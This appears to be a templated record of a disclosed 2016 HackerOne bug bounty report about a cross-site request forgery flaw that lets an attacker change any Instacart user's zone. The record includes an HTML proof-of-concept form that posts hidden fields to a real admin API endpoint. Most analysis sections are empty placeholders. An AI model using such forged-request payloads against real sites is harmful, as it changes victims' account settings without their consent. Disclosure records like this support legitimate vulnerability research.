# Cross-Site Request Forgery (CSRF)

## Metadata
- **Source:** HackerOne
- **Report:** 157993 | https://hackerone.com/reports/157993
- **Submitted:** 2016-08-09
- **Reporter:** malcolmx
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Hello,

i found Cross-Site Request Forgery (CSRF) that can change any user ZONE 

POC:

```
<html>
  <body>
    <form action="https://admin.instacart.com/api/v2/zones" method="POST">
      <input type="hidden" name="zip" value="10001" />
      <input type="hidden" name="override" value="true" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```
put Zone you wa

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello,

i found Cross-Site Request Forgery (CSRF) that can change any user ZONE 

POC:

```
<html>
  <body>
    <form action="https://admin.instacart.com/api/v2/zones" method="POST">
      <input type="hidden" name="zip" value="10001" />
      <input type="hidden" name="override" value="true" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```
put Zone you want send the request to any user and you will change his Zone

__Please Watch My POC I Attached For More Details__
Thanks

</details>

---
*Analysed by Claude on 2026-05-24*
